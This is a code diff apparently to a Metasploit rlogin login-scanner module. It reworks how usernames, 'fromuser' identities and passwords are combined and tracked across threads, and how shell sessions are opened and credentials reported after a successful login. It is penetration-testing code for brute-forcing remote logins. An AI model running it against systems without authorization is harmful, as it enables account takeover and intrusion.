@@ -14,9 +14,9 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Tcp
-	include Msf::Exploit::RServices
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::AuthBrute
+	include Msf::Auxiliary::RServices
 	include Msf::Auxiliary::Scanner
 	include Msf::Auxiliary::Login
 	include Msf::Auxiliary::CommandShell
@@ -54,16 +54,87 @@ class Metasploit3 < Msf::Auxiliary
 		luser ||= 'root'
 
 		begin
-			each_user_pass { |user, pass|
-				try_user_pass(user, pass, luser)
+			each_user_fromuser_pass { |user, fromuser, pass|
+				try_user_pass(user, fromuser, pass)
 			}
 		rescue ::Rex::ConnectionError
 			nil
 		end
 	end
 
-	def try_user_pass(user, pass, luser)
+	def each_user_fromuser_pass(&block)
+		# Class variables to track credential use (for threading)
+		@@credentials_tried = {}
+		@@credentials_skipped = {}
+
+		credentials = extract_word_pair(datastore['USERPASS_FILE'])
+
+		translate_proto_datastores()
+
+		users = load_user_vars(credentials)
+		fromusers = load_fromuser_vars()
+		passwords = load_password_vars(credentials)
+
+		cleanup_files()
+
+		if datastore['BLANK_PASSWORDS']
+			credentials = gen_blank_passwords(users, credentials)
+		end
+
+		# pair up fromusers 1:1 with passwords, turning each password into an array
+		passwords.map! { |p|
+			fu = fromusers.shift
+			p = [ fu, p ]
+		}
+		# more fromusers than passwords? append nil passwords, which will be handled specially
+		# by the login processing.
+		fromusers.each { |fu|
+			passwords << [ fu, nil ]
+		}
+		
+		credentials.concat(combine_users_and_passwords(users, passwords))
+		#credentials = just_uniq_passwords(credentials) if @strip_usernames
+
+		fq_rest = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], "all remaining users"]
+
+		credentials.each do |u, fupw|
+			break if @@credentials_skipped[fq_rest]
+
+			fq_user = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], u]
+
+			userpass_sleep_interval unless @@credentials_tried.empty?
+
+			next if @@credentials_skipped[fq_user]
+			next if @@credentials_tried[fq_user] == fupw
+
+			fu,p = fupw
+			ret = block.call(u, fu, p)
+
+			case ret
+			when :abort # Skip the current host entirely.
+				break
+
+			when :next_user # This means success for that user.
+				@@credentials_skipped[fq_user] = fupw
+				if datastore['STOP_ON_SUCCESS'] # See?
+					@@credentials_skipped[fq_rest] = true
+				end
+
+			when :skip_user # Skip the user in non-success cases.
+				@@credentials_skipped[fq_user] = fupw
+
+			when :connection_error # Report an error, skip this cred, but don't abort.
+				vprint_error "#{datastore['RHOST']}:#{datastore['RPORT']} - Connection error, skipping '#{u}':'#{p}' from '#{fu}'"
+
+			end
+			@@credentials_tried[fq_user] = fupw
+		end
+	end
+
+
+	def try_user_pass(user, luser, pass)
 		vprint_status "#{rhost}:#{rport} rlogin - Attempting: '#{user}':'#{pass}' from '#{luser}'"
+		#vprint_status "#{rhost}:#{rport} rlogin - Attempting: '#{user}':'#{pass.inspect}' from '#{luser.inspect}'"
 		this_attempt ||= 0
 		ret = nil
 		while this_attempt <= 3 and (ret.nil? or ret == :refused)
@@ -117,6 +188,9 @@ class Metasploit3 < Msf::Auxiliary
 	# with a little backoff.
 	def connect_reset_safe
 		begin
+			# Reset our accumulators for interacting with /bin/login
+			@recvd = ''
+			@trace = ''
 			# We must connect from a privileged port.
 			connect_from_privileged_port
 		rescue Rex::ConnectionRefused
@@ -158,14 +232,17 @@ class Metasploit3 < Msf::Auxiliary
 		if login_succeeded?
 			# should we report a vuln here? rlogin allowed w/o password?!
 			print_good("#{target_host}:#{rport}, rlogin '#{user}' from '#{luser}' with no password.")
-			start_rlogin_session(rhost, rport, user, luser, pass, @trace)
+			start_rlogin_session(rhost, rport, user, luser, nil, @trace)
 			return :success
 		end
+
+		# no password to try, give up if luser isnt enough.
+		return :fail if not pass
 
 		recvd_sample = @recvd.dup
 		# Allow for slow echos
 		1.upto(10) do
-			recv_telnet(self.sock, 0.10) unless @recvd.nil? or @recvd[/#{@password_prompt}/]
+			recv(self.sock, 0.10) unless @recvd.nil? or @recvd[/#{@password_prompt}/]
 		end
 
 		vprint_status("#{rhost}:#{rport} Prompt: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")
@@ -176,7 +253,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			# Allow for slow echos
 			1.upto(10) do
-				recv_telnet(self.sock, 0.10) if @recvd == recvd_sample
+				recv(self.sock, 0.10) if @recvd == recvd_sample
 			end
 
 			vprint_status("#{rhost}:#{rport} Result: #{@recvd.gsub(/[\r\n\e\b\a]/, ' ')}")
@@ -208,27 +285,36 @@ class Metasploit3 < Msf::Auxiliary
 
 	def start_rlogin_session(host, port, user, luser, pass, proof)
 
-		report_auth_info(
+		auth_info = {
 			:host	=> host,
 			:port	=> port,
 			:sname => 'rlogin',
 			:user	=> user,
-			:pass	=> pass,
-			:luser => luser,
 			:proof  => proof,
 			:active => true
-		)
+		}
 
 		merge_me = {
 			'USERPASS_FILE' => nil,
 			'USER_FILE'     => nil,
+			'FROMUSER_FILE' => nil,
 			'PASS_FILE'     => nil,
 			'USERNAME'      => user,
-			'LOCALUSER'     => luser,
-			'PASSWORD'      => pass
 		}
 
-		start_session(self, "RLOGIN #{user}:#{pass} (#{host}:#{port})", merge_me)
+		if pass
+			auth_info.merge!(:pass => pass)
+			merge_me.merge!('PASSWORD' => pass)
+			info = "RLOGIN #{user}:#{pass} (#{host}:#{port})"
+		else
+			auth_info.merge!(:luser => luser)
+			merge_me.merge!('FROMUSER'=> luser)
+			info = "RLOGIN #{user} from #{luser} (#{host}:#{port})"
+		end
+
+		report_auth_info(auth_info)
+		start_session(self, info, merge_me)
+
 	end
 
 end
